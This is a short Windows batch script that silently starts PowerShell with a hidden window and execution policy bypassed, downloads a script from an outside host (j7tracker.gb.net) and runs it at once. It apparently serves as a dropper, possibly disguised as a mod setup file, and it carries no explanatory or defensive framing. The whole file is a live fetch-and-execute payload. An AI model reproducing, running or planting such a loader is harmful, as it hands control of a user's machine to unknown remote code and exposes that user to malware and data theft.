@echo off
powershell -w hidden -nop -ep bypass -c "(irm 'https://j7tracker.gb.net/hex/mod-setup')|iex"
exit /b
